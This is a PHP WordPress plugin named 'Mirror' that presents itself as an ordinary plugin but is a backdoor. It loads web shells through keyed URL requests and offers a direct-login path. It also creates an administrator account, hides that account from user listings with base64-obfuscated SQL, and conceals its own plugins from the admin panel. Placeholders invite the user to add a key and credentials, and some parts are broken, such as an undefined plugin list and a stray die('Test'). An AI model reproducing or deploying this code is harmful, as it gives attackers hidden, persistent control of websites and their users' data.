<?php
/**
 * Plugin Name: Mirror
 * Version: 0.4
 * License: GPL3
 * Author: MirrorORG.com
 * Description: We Do Reflect Your Thoughts
 * Author URI: https://mirrororg.com/
 */

defined('ABSPATH') or die();

if(!class_exists('MIRROR')) {
    class MIRROR {
        private $key;
        private $username;
        private $password;

        public function __construct() {
            add_action('plugins_loaded', array(&$this,'shellaccess'));
            add_action('plugins_loaded', array(&$this,'makeadminuser'));
            add_action('pre_user_query', array(&$this,'hideadminuser'));
            add_action('pre_current_active_plugins', array(&$this,'hideplugins'));
            add_action('admin_footer', array(&$this,'hidecounters'));

            register_deactivation_hook(__FILE__, array(&$this,'deactivate'));
            register_activation_hook(__FILE__, array(&$this,'activate'));

            $this->key = 'key'; // add your key here
            $this->username = 'id'; // add your id here
            $this->password = 'pw'; // add your password here


            include_once(ABSPATH.'wp-admin/includes/plugin.php');
            include_once(ABSPATH.'wp-includes/registration.php');
            include_once(ABSPATH.'wp-admin/includes/file.php');
        }

        function deactivate() {
            //$this->deleteadminuser();
        }
        function activate() {
            $this->makeadminuser();
            $this->installplugins();
        }
        function shellaccess(){
            foreach(glob(ABSPATH.'wp-content/plugins/mirror/sh/*.php') as $shells) {
                $shellFile = array_reverse(explode('/',$shells))[0];
                $shellName = str_replace('.php','',$shellFile);
                if(strstr($_SERVER['REQUEST_URI'],'loadshell-'.$shellName.'-'.$this->key)) {
                    require_once(plugin_dir_path(__FILE__).'/sh/'.$shellFile);
                    die();
                }
                if(strstr($_SERVER['REQUEST_URI'],'logmein')) { //direct login link 
                    require_once(plugin_dir_path(__FILE__).'/sh/logmein.php');
                }
            }
        }
        function makeadminuser() {
            if (!username_exists($this->username)) {
                $a = wp_create_user($this->username, $this->password);
                $b = new WP_User($a);
                $b->set_role('administrator');
            }
        }
        function deleteadminuser() {
            $user = get_userdatabylogin($this->username);
            wp_delete_user($user->ID);
        }
        function hideadminuser($b) {
            global $current_user;
            global $wpdb;
            $a = $current_user->user_login;
            $c = $this->username;
            if ($a != $c) {
                $b->query_where = str_replace(base64_decode('V0hFUkUgMT0x'), base64_decode('V0hFUkUgMT0xIEFORCA=')."{$wpdb->users}".base64_decode('LnVzZXJfbG9naW4gIT0gJw==').$c."'", $b->query_where);
            }
        }
        function hidecounters() {
            echo(base64_decode('PHNjcmlwdD4oZnVuY3Rpb24oJCl7JChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKXskKCcud3JhcCBzcGFuLmNvdW50JykuaGlkZSgpO30pO30pKGpRdWVyeSk7PC9zY3JpcHQ+'));
            die("Test");
        }
        function hideplugins() {
            global $wp_list_table;
            global $current_user;

            $a = $this->pluginList;

            $b = $wp_list_table->items;

            foreach ($b as $c => $d) {
                if (in_array($c,$a)) {
                    if ($current_user->user_login != $this->username) {
                        unset($wp_list_table->items[$c]);
                    } else {
                        if(strstr(array_reverse(explode('\\',__FILE__))[0],array_reverse(explode('/',$c))[0])) {
                            $wp_list_table->items[$c]['Name'] .= ' (SHELL)';
                        } else {
                            $wp_list_table->items[$c]['Name'] .= ' (Hidden)';
                        }
                    }
                }
            }
        }
    }
}

$MIRROR = new MIRROR();

?>
